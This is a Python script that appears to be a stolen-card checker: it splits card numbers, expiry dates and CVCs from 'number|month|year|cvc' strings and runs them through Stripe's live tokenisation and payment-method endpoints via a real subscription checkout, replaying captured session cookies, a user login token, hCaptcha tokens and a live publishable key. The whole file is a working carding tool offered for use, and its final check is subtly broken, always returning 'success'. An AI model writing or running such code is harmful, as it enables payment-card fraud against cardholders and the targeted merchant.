import requests
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests

	headers = {
		'accept': 'application/json',
		'accept-language': 'en-US,en;q=0.9',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'priority': 'u=1, i',
		'referer': 'https://js.stripe.com/',
		'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
	}

	data = f'guid=e90b6956-54e0-492f-adb1-4d7add27b1c0c94c72&muid=2140571e-b833-4116-99b6-35f5fa3da9afc53bc5&sid=bb6c666f-8495-432a-a194-cf2a97f7429aa7e651&referrer=https%3A%2F%2Fbuy.tinypass.com&time_on_page=78448&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&card[address_zip]=10080-&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQaqXBn73pWg1iPuVJ3fUG56BuMkc8Q_bP3_vUKwwpQAxPv-qqJe5WyzcwsjNG8X-mKrGQb7R05_aQxORahLhEyMUxkswmKm-zWZ-UJaa8EqQkGlZu4wplU1RjQqAsGBNYB-E4inb8S2khNVm-_9lm23PqHDhcKHVAuowp_Dsiifc5NoX5CBtWkL_Ejfun_udwAiYM2P98yB7CzBL7Ffil51bxhGn-3mu7j4JXA-QVBFBZe72_vZP7vtG6qEsGbxonPMklBeAEA7Lz_7ttgLe2duxKZqlCQSw6COObmqx3L3JwjrKUxArZ-vkSlDwPaPbcXbD8MqXkjrfVPOkyff31ljfiAfSrEmzgtLrm5wff4YqZ7dLYrrYd0Aub4zBfV2nb1wTfmWu4HJSNJyjLMieeK89hv6f-RCL39ZI1BhMVqVCjw4UAkZBFJWVcaCAqT3qnFrIwMGlDTZ0sEY3ZzogulRu_S_R2lTtad_lkr3LnHS6iTntSHeEF0GKf3fY4eIRXL5ZghzERDclyiwJT02ge6QQHSYbLLj9ALr4GCu9cVJ5B19DXiZg_nhhZFN39oOicU88pFS0hKEkbqcYWFHFej3VV_MNi4mp3y2ldfdlMc-EHacBel9yIbC4vOt8Tdka1RFrd1VOnnpPrpUWBwoGH7A_9tK1Di83r6Tjlzti3S13GypmeLLmnbWzrlAsFeW4U18aRk98fSXwWptiUTvNNaS-6cPrOtbTAQuK6kZtaNusQxxZgmIKGZWaBLGT3iyWCqVgm_OKpujV5Ng5zQsYCDpkVj8U80X6EwA6SV2sOJmUJa7ZmQBjKP9zNR3wH-cqE5be48J00u4Vv1bX6drBiRPy3jl9bUY1nEQt5mVpIvqOl8eU6FcMEtOOkfmo6LN7PQNZyoV0S-jVhifN16yMnlBq7ovY2rKpHqXRnR03FEsistFk-Pnc_eLVG04Jkv-jkVhH4wOQRzjDVA6ThwFX2mfCScCYpOmLBDCSGvxw2gQt41dYTWluxaSXM9BgPDi2Vvd4piBI_udtDpg9RnJFsSH5SdXJo9n4tjgDb3tJ7KUZOK_CXXIhf6EnHsmbASX30TyU4OfZLQ1cuQZzUncpNG1yANUjT8-34_Pru6Q2riflxphuYCtihuXCwQWrYLhWF_p-5mwm9usN16q4xZqIkTtxEUpzxxJDiYlZRuVDrl0yKl332xZjmLMEn27jAaB_VGTa37OJbsrcS4Zlzbgs1kTNlFGaO0yOOMaSDNq4NUxRVUwfEKhCdJWwStcF_Nl7gbkJmEoFSWE-QsJYuKKSVnO-CDHZyajF0eTUcUIJR-jCBoAvsp9s9Hpp-o7tBQ88TAJvgN9LY2JcmKve3T_ng8ZEC6wjmJiSSutRw5BRjxDzSP-suXFaE00LDaVZiyfPQi-J2cwSDJPP9DHtEYKJ8a4BvHXf-cHSfG_rLj5mzJc1KrT-L37_cEZU8DFmf9kSJ9vrfA0ENQ-grnDsGjBNKCkwm0laL-7QC_Q4YqZBsWoV2qO31fvuBbQs9wNT6iX4PcSDAOhf3JnnKMjK5tLgRcAWyBaxtiJoh-koxD2flDVdE7Id6wE2DcGLkAPEUD0SnFxo_y57oH2FyvNGG0C1puy-i7Obof3tw4BxYgsumH0HShlpfHuHAiL0eiSHHrvVhbP0KEDjh4d1lP7pM8muRN19O6VSnGOIwBWR6Xwsgb_rvs8lY8zidO4L-ZntOUZ0v0tx0Qi7QQFMKTZlisI-HuODAi_FHOp2SbEHpspNL_B3wkrc_Fvw10VbZBzqqTJIjzMmPwvR_t5T4db5RcWMrt5jXRfKzxb3XS5PU_QBf88Ds9wl-gWmUPwkzx1eAOFZehHLMulhiRmQi9qqWjkHiSej1jDtWmHU6bR8-1P3gyoduooaPWrGL4t3StLUV2z4iQjwdgjEcghub9ZQgldB70L4JrgHgIACLoYb_Jmy4R-NvTVLMRpVnL7Sh7cf3MpYO8FhxhuIbmcv4boUhcvIEoKYn3yxHMj5go0luv3d_ININpuX45g56zAEJQ7OxpFd9spShEMm7wH2dZr3P7sWAaA2b0iaQp-xRIiNZFtvW48-LS1H0hWCUuG6Y6YINF7uETnIEPzkNgSQSP0ajb5S8mA9fS4l8JDwzAK8RXb0ULONZDJ5RTMwCfIDOWHmVMz_swZiSWJuvX8c4ESgljmukJ8ymWfwd-FqHjV5M8qMIZ0ltYKFCpt5J2XI-VcRPkGo7sWaa8OHrgLBkQGowJr07jrqS7JoYr0q_MBrWWjZXhwzmZOS_ioc2hhcmRfaWTOAzGDb6Jrcqg0NGQ5NTdjZKJwZAA.Ez85qEvtt69RJUj-pTdD69u_A6WXIhwm0Xx9in7xIxQ&payment_user_agent=stripe.js%2F2af5aa9c2a%3B+stripe-js-v3%2F2af5aa9c2a%3B+split-card-element&pasted_fields=number&key=pk_live_51LVySpCF6Y3bmA7rkKQVz3GhY7tr9dZHBvfyGoGibaJD0FCd3qPqTQx9Nt38YOPv2bPBzvjl8E05J48V5tATfjYU005tE2De0t&_stripe_account=acct_1OpD3bB036L8SfDC'

	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return '#'
	import requests

	cookies = {
		'LANG': 'en_US',
		'ch_sid': 'FRIdrckTN12SLVc',
		'LANG_CHANGED': 'en_US',
		'JSESSIONID': 'AB4E6DB786AC44EBDBB7A6B480BA2A9B',
	}

	headers = {
		'accept': 'application/json, text/plain, */*',
		'accept-language': 'en-US,en;q=0.9',
		# 'cookie': 'LANG=en_US; ch_sid=FRIdrckTN12SLVc; LANG_CHANGED=en_US; JSESSIONID=AB4E6DB786AC44EBDBB7A6B480BA2A9B',
		'ng-request': '1',
		'priority': 'u=1, i',
		'referer': 'https://buy.tinypass.com/checkout/offer/show?displayMode=modal&templateId=OTVKJ7X2U9A9&offerId=OF8A051PW9Q1&formNameByTermId=%7B%7D&hideCompletedFields=true&showCloseButton=false&experienceActionId=showOfferJIMTQVPM2E8222&experienceId=EXHPIXOKWW3X&widget=offer&iframeId=offer-0-Embj7&url=https%3A%2F%2Faccounts.outsideonline.com%2Foidc-frontend%2Fpurchase-membership%3FredirectUrl%3D%252Fsignup%252Fnewsletter%253Fnext%253Dhttps%25253A%25252F%25252Fwww.outsideonline.com%25252Foutsideplus%25252F&parentDualScreenLeft=-8&parentDualScreenTop=0&parentWidth=1366&parentHeight=640&parentOuterHeight=735&aid=gL0Np9Mqpu&customVariables=%7B%22executeCheckout%22%3A%22expanded%22%2C%22trialRedeemed%22%3Afalse%7D&browserId=lwi8fguj81kmgq8m&pianoIdUrl=https%3A%2F%2Fid.tinypass.com%2Fid%2F&userProvider=piano_id_lite&userToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImFkZW5hMTNAYXdnYXJzdG9uZS5jb20iLCJmaXJzdF9uYW1lIjoiRXlhZCIsImxhc3RfbmFtZSI6InV0dHV1dHR1IiwidXVpZCI6IjkyMjZiYmJlLWU5MTUtNDlhNS1hNzAwLWY0ZWNiN2YxODk4NiIsInJvbGVzIjoiW1wiZnJlZV9tZW1iZXJzaGlwXCIsIFwicmVnaXN0ZXJlZFwiXSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiYXV0aF90b2tlbiI6ImI2YTA2ZjAzMTYyMmViMjQ0MGFiN2VjNDk1ZGJkODNmMTZhZjY0ZjciLCJzdWIiOiI5MjI2YmJiZS1lOTE1LTQ5YTUtYTcwMC1mNGVjYjdmMTg5ODYiLCJhdWQiOiJSMVF6VTBoWFdFNVJNalV4VGxkWlZGb3dRMG94TVZWV1FWcFRVRXd4VGs1Uk1rSlhVVVE0VFRKQk5qSkhORTVZT0RoSFNGZ3kiLCJhdXRoX2R0IjoxNzE2NDA3MTE3LCJpc3MiOiJvdXRzaWRlb25saW5lLmNvbSIsImlhdCI6MTcxNjQwNzExNywianRpIjoiZTE1M2U3YmYtYmVkYS00YzQ4LWIzNzUtY2RmNDI4NDI1OGMyIiwiZXhwIjoxNzE3MDExOTE3fQ.WNYT_NEdMNJ9b-f6MbRWN7LeF3cAk81wuyp6L0fH_zQ&customCookies=%7B%7D&hasLoginRequiredCallback=true&initMode=context&requestUserAuthForLinkedTerm=true&initTime=4241.699999999255&logType=offerShow&width=1366&_qh=56eea0a796',
		'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
		'x-requested-with': 'XMLHttpRequest',
	}

	params = {
		'storeInVault': 'true',
		'uid': '5vqgbJn88NxA3Z62Q_3qvVKXYsnciUlB_uYud6a6zESJx5bwlhBcDa8Z9bitvsiL',
		'termId': 'TM2I36W2JZV2',
		'store_in_vault': 'true',
		'OID': 'P0s3SQzT9RmZjzH9u0N2dcSW4PuxglQB',
		'oid': 'C0V6ZPYYT8LY6jUFnSwzBJ5vFrZh0YrZ',
		'term_id': 'TM2I36W2JZV2',
		'source': '40',
		'aid': 'gL0Np9Mqpu',
		'instrumentId': 'id',
		'storeInstrument': 'true',
	}

	response = requests.get(
		'https://buy.tinypass.com/checkout/offer/stripeInitiateTransaction',
		params=params,
		cookies=cookies,
		headers=headers,
	)

	import requests

	headers = {
		'accept': 'application/json',
		'accept-language': 'en-US,en;q=0.9',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'priority': 'u=1, i',
		'referer': 'https://js.stripe.com/',
		'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&billing_details[address][postal_code]=10080-&guid=e90b6956-54e0-492f-adb1-4d7add27b1c0c94c72&muid=2140571e-b833-4116-99b6-35f5fa3da9afc53bc5&sid=bb6c666f-8495-432a-a194-cf2a97f7429aa7e651&pasted_fields=number&payment_user_agent=stripe.js%2F2af5aa9c2a%3B+stripe-js-v3%2F2af5aa9c2a%3B+split-card-element&referrer=https%3A%2F%2Fbuy.tinypass.com&time_on_page=80575&key=pk_live_51LVySpCF6Y3bmA7rkKQVz3GhY7tr9dZHBvfyGoGibaJD0FCd3qPqTQx9Nt38YOPv2bPBzvjl8E05J48V5tATfjYU005tE2De0t&_stripe_account=acct_1OpD3bB036L8SfDC&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQapskH2u_x5RkuQv_lDXGo1Jd0lVykZFyTNGQR7Dr0kPewqkSxIKf5FI8b_HqYVKIceVj36dC_fP2iQJTYPtR8rwbxFNSfYEC5IUf0SvMFOrc5BtLv1x8LSMRilaPsZgdtCzkU6JOihHMbEdPWHyx5CMw8sMKzPjZ9Pu4OEFJNzn6FBrrLniVrQFTY8q3X5K-9CGxr9__jnDD3tirsY4TVD0DRIstSV6SMPKWiZUhYqsEdtDBFRMcpkYukSYjpsxuKYhNgWAj1hbvS9G-zDVPUh2WX5BOAWd7_lcbPbSjunhrCwWsg2NweLHh6RyeQ3904Pxxam3ASaf1K7gQJyHei_oPTI_KhbbfA37cXv1D7hpUqXpqzaeGkNIsTcf3Jser8mQFLs-kCnEK1CfXQa2PaWMns4K-6fWfH_3j50lH7nC2XSXaqwBVTAO_JirRxPIE3gvRhK2kw6OxpT-OLwC0AP7omXG_ePNsvUz0DwW-G2PWgdeMSXfuwbJaLervvb7X_K5TITroERmxNXUwjIck0E9V__wKgjMSNFCyBZstWE_jBnUawGQUVkQTMoyZ0kllqqRMMlBp3dvmImPl64lZInZ_0wGDwlU2D9gvkwgvGvQyv78qhKd-Z4OoJQnRNu620mTeqKt7F8hyYvPzPwOB9-MSoSXHSYOoQJgGV2tF8i2ilKjfVQ6gWRekVk2CQFvJ_sUPr_tZszkf6AXqHU5JwId8k6C8m1ntJNw9-X8H36neYaRhoU87Hzzk4-9PdrW3tLsjBiOi7JX4uomGBaK4ldSWHnLiAXR-lF6TZoYagzh_PM4i52zc3DrjqeHIvP3_AP_E0hp2hvb5dFgssU0sbMklAKZsguf3MyUHiGX6QHkeY9SQ4NCe2wObv4rrvJxPqWfRW6XV0YlyPiGKUKsvKG1hUiNReBJIzy-nCpAdEyEb6FRQxN22-BTR5egFM3LbhjuiAoUXupIWEZXafeAmNQcPpcl9wOX6_AkoRoyPELbDLitve8hA20Tmqans7tIDx81gwbV7XH5AlAT_ac4g-jiKtd1yHg1flCujE4PYDTFXZ9nLxD4UgWqVq9B1FhUT0ejSlptXSAuqTVjzmF7pfTXBS8xRwcjspGF96POSXHabIHJzRcgjEqLAfimq6_WCQ3j-9r3D8oYR_DwGaY7_8jPxUiWJMm0RhIrcoaFoyS24ScJaRedNqv1SrN4M2CeWBli6MD62iGUPVLhX0vJ22wpjSlWVssoHQv_dc3UE83_jGCAlJWbvIRBwAWYNmjxuoWbzOqT8l7D_KIENFmDhwll1W6edEcFJSM97LclFXK_1ZhjYC3b3Cx9iM4GcyjKZKhJ0hlj7ofYnCXM0HFkqABBUUxlBootxic280lg7QjFOqYCYXAtKB_LXwRZy-iE_HXCMnRP2tSIm-rBxBqXmoqX-1tlHgsQ8hCehAmuN6yDrThqAqwRQbzr9ZUXPvRqhgZsWL_khhShFs2atBI0SY94rfwJvgB2BPiQNkiuVYhsJQM8A9y_wrqcBFwNl2VY61_UWWjGYQg0ToqDdAiti6HqUx-MKk3J4hsyF51Nm17tGWdj7U5zVOtIO3ynLUCIir7-tQbMH0MRQHAtL419v2th5A8f8mUY6C2TKclx37wM41vE881yiUKxAANYKyN5m_EFAHV-6WMVnokRGYkBt6rwVA-QiRn6uc_v5dS0aVWtS1xdhoVUsVX5rer1YRlalpM0POOXfTXYeIs2JC6T3WtC2pIYkUBuhCA0PdUwQCv637N0qWGo605SMBoNcS8JPeEUqnKMYBpprx24B_MndZyOhweGttv_NAqHw4HGYHsmwEHfI4oj_6CmHYHKTIIA-mHetgAxH9J9HDAvoAGPO2sbmavXGBdLEn49xCKikWLmLcmoh7pecvJ6OGBS0ST2CISEYzK7AKUJFmRELWhF66f8-XGJjzrOd0LzZy7qhNSluZCZ7z1ul0xrEjJuwtY_mBIN-jbEWY5q6PktmYLE_92457wdYNs8n1Aa_C_T2PmAsCbkFNEPusEduEnkXEW-rAf2ogL3DKWc1Z88SC0FN7V-gdScNtCOrFkPaThSi2cMbYE9AvofFj5z_99EFot7bLKNsipdyd8s8thcTOXfPWIny_2KDRsaA6PvUds9XeGVviCIo_HM7U4ym7T9zYfwf-lB3B5OCWIMVpxCbt6QELs52dosbMutuh1eP5XD_enBc03mnvSIzQ6OkUiLYp6mBr3omLf2vZtgufUcto1bVBftrqa7GVtea7XIKNleHDOZk5MHahzaGFyZF9pZM4DMYNvomtyqDI4MDg5MGNjonBkAA.y7zHHcmByR8PDghJYRSEFsZw1s354T5lrXtRb-0SBZA'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		ii=response['validation_feedback']
	except:
		return 'success'
	return ii